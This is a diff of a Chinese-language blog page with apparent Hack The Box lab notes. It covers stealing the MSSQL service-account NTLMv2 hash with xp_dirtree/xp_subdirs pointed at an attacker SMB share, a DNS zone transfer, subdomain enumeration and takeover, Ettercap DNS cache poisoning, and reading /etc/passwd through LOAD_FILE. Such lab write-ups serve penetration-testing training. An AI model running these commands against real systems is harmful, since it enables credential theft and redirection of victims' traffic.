@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#00a596>
+                <a href="/tags/base" style=color:#ffa2c4>
                     base
                 </a>
             </span>
@@ -798,6 +798,105 @@ Query OK, 1 row affected (0.001 sec)
 <p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p>
 <h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);
 </code></pre>
+<h2 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h2><p>在攻击SMB部分，我们讨论了我们可以创建一个假的SMB服务器来窃取哈希并在Windows操作系统中滥用一些默认实现。我们还可以使用xp_subdirs或xp_dirtree未记录的存储过程窃取MSSQL服务帐户哈希，这些存储过程使用SMB协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向SMB服务器时，目录侦听功能将强制服务器进行身份验证并发送运行SQL server的服务帐户的NTLMv2哈希。 为了实现这一点，我们需要首先启动Responder或impacket-smbserver，并执行以下SQL查询之一：</p>
+<h4 id="XP-DIRTREE-Hash-Stealing"><a href="#XP-DIRTREE-Hash-Stealing" class="headerlink" title="XP_DIRTREE Hash Stealing"></a>XP_DIRTREE Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;
+2&gt; GO
+</code></pre>
+<h4 id="XP-SUBDIRS-Hash-Stealing"><a href="#XP-SUBDIRS-Hash-Stealing" class="headerlink" title="XP_SUBDIRS Hash Stealing"></a>XP_SUBDIRS Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;
+2&gt; GO
+</code></pre>
+<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>What is the password for the “mssqlsvc” user?</p>
+</blockquote>
+<p>这里尝试了用给到的字典进行爆破，发现不可行，反复阅读文案后发现可以导出hash：</p>
+<p>先监听</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122043562.png" alt="image-20230812204234008"></p>
+<p>然后执行查询语句弹回hash</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230812204400386.png" alt="image-20230812204400386"></p>
+<p>然后破解hash即可</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122050713.png" alt="image-20230812205036653"></p>
+<h1 id="Attacking-DNS"><a href="#Attacking-DNS" class="headerlink" title="Attacking DNS"></a>Attacking DNS</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
+Nmap scan report for 10.10.110.213
+Host is up (0.017s latency).
+
+PORT    STATE  SERVICE     VERSION
+53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+</code></pre>
+<p>DNS区域是特定组织或管理员管理的DNS命名空间的一部分。由于DNS包括多个DNS区域，DNS服务器利用DNS区域传输将其数据库的一部分复制到另一个DNS服务器。除非DNS服务器配置正确（限制哪些IP可以执行DNS区域传输），否则任何人都可以向DNS服务器索取其区域信息的副本，因为DNS区域传输不需要任何身份验证。此外，DNS服务通常在UDP端口上运行；然而，在执行DNS区域传输时，它使用TCP端口进行可靠的数据传输。 攻击者可以利用此DNS区域传输漏洞来了解有关目标组织的DNS命名空间的更多信息，从而增加攻击面。为了利用此漏洞，我们可以使用带有DNS查询类型AXFR选项的dig实用程序从易受攻击的DNS服务器中转储整个DNS命名空间：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213
+;; global options: +cmd
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+inlanefrieght.htb.         604800  IN      AAAA    ::1
+inlanefrieght.htb.         604800  IN      NS      localhost.
+inlanefrieght.htb.         604800  IN      A       10.129.110.22
+admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
+hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
+support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 28 msec
+;; SERVER: 10.129.110.213#53(10.129.110.213)
+;; WHEN: Mon Oct 11 17:20:13 EDT 2020
+;; XFR size: 8 records (messages 1, bytes 289)
+</code></pre>
+<p>像 <a target="_blank" rel="noopener" href="https://github.com/mschwager/fierce">Fierce</a>这样的工具也可以用来枚举根域的所有DNS服务器，并扫描DNS区域传输：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]# fierce --domain zonetransfer.me
+</code></pre>
+<h2 id="Domain-Takeovers-amp-Subdomain-Enumeration"><a href="#Domain-Takeovers-amp-Subdomain-Enumeration" class="headerlink" title="Domain Takeovers &amp; Subdomain Enumeration"></a>Domain Takeovers &amp; Subdomain Enumeration</h2><p>在执行子域接管之前，我们应该使用<a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">Subfinder</a>等工具枚举目标域的子域。这个工具可以从像 <a target="_blank" rel="noopener" href="https://dnsdumpster.com/">DNSdumpster</a>这样的开放源代码中抓取子域。<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等其他工具也可以通过提供预先生成的单词列表来使用暴力子域：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]# ./subfinder -d inlanefreight.com -v       
+                                                                       
+        _     __ _         _                                           
+____  _| |__ / _(_)_ _  __| |___ _ _          
+(_-&lt; || | &#39;_ \  _| | &#39; \/ _  / -_) &#39;_|                 
+/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
+                projectdiscovery.io                    
+                                                                       
+[WRN] Use with caution. You are responsible for your actions
+[WRN] Developers assume no liability and are not responsible for any misuse or damage.
+[WRN] By using subfinder, you also agree to the terms of the APIs used. 
+                                   
+[INF] Enumerating subdomains for inlanefreight.com
+[alienvault] www.inlanefreight.com
+[dnsdumpster] ns1.inlanefreight.com
+[dnsdumpster] ns2.inlanefreight.com
+...snip...
+[bufferover] Source took 2.193235338s for enumeration
+ns2.inlanefreight.com
+www.inlanefreight.com
+ns1.inlanefreight.com
+support.inlanefreight.com
+[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
+</code></pre>
+<p>一个很好的替代方案是一种名为<a target="_blank" rel="noopener" href="https://github.com/TheRook/subbrute">Subbrute</a>的工具。该工具允许我们使用自定义解析器，并在无法访问Internet的主机上进行内部渗透测试时执行纯DNS暴力攻击。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1
+Tanin@htb[/htb]$ cd subbrute
+Tanin@htb[/htb]$ echo &quot;ns1.inlanefreight.com&quot; &gt; ./resolvers.txt
+Tanin@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
+</code></pre>
+<p>有时内部物理配置的安全性很差，我们可以利用它从U盘上传工具。另一种情况是，我们已经通过转向到达了一个内部主机，并希望在那里工作。当然，还有其他选择，但知道其他方式和可能性并没有坏处。 该工具发现了四个与inlanefreight.com相关的子域。使用nslookup或host命令，我们可以枚举这些子域的CNAME记录。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]# host support.inlanefreight.com
+
+support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
+</code></pre>
+<p>支持子域有一个指向AWS S3存储桶的别名记录。但是，URL<a target="_blank" rel="noopener" href="https://support.inlanefreight.com显示了一个nosuchbucket错误,表明子域可能容易受到子域接管的攻击.现在,我们可以通过创建一个具有相同子域名称的aws/">https://support.inlanefreight.com显示了一个NoSuchBucket错误，表明子域可能容易受到子域接管的攻击。现在，我们可以通过创建一个具有相同子域名称的AWS</a> S3 bucket来接管子域。</p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a>存储库也是子域接管漏洞的绝佳参考。它显示了目标服务是否易受子域接管的攻击，并提供了评估漏洞的指导方针。</p>
+<h4 id="Local-DNS-Cache-Poisoning"><a href="#Local-DNS-Cache-Poisoning" class="headerlink" title="Local DNS Cache Poisoning"></a>Local DNS Cache Poisoning</h4><p>从本地网络的角度来看，攻击者还可以使用 <a target="_blank" rel="noopener" href="https://www.ettercap-project.org/">Ettercap</a> 或<a target="_blank" rel="noopener" href="https://www.bettercap.org/">Bettercap</a>等MITM工具执行DNS缓存中毒。 要通过Ettercap利用DNS缓存中毒，我们应该首先编辑&#x2F;etc&#x2F;Ettercap&#x2F;etter.DNS文件，以映射他们想要欺骗的目标域名（例如，inlanefreight.com）和他们想要将用户重定向到的攻击者的IP地址（例如，192.168.225.110）：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]# cat /etc/ettercap/etter.dns
+
+inlanefreight.com      A   192.168.225.110
+*.inlanefreight.com    A   192.168.225.110
+</code></pre>
+<p>接下来，启动Ettercap工具，并通过导航到主机&gt;扫描主机来扫描网络中的活动主机。完成后，将目标IP地址（例如192.168.152.129）添加到Target1，并将默认网关IP（例如192.168.152.2）添加到Target2。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743246.png" alt="img"></p>
+<p>通过导航到插件&gt;管理插件来激活dns_恶搞攻击。这将向目标计算机发送假DNS响应，该响应将解析inlanefreight.com到IP地址192.168.225.110：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743982.png" alt="img"></p>
+<p>成功的DNS欺骗攻击后，如果来自目标机器192.168.152.129的受害者用户在web浏览器上访问inlanefreight.com域，他们将被重定向到IP地址192.168.225.110上的虚假页面，此外，从目标IP地址192.168.152.129到inlanefreight.com的ping也应解析为192.168.225.110：</p>
+<h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>Find all available DNS records for the “inlanefreight.htb” domain on the target name server and submit the flag found as a DNS record as the answer.</p>
+</blockquote>
 
     </div>
 
